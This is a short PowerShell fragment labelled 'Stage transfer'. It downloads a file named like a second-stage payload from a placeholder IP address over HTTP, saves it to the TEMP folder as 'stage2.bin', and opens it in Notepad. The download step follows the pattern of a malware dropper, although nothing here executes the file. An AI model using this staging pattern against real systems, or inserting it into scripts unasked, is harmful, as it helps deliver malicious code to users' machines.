
<# Stage transfer #> $FetchUrl = "http://192.0.2.39:8080/assets/update.dat"; $OutputPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $OutputPath); Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
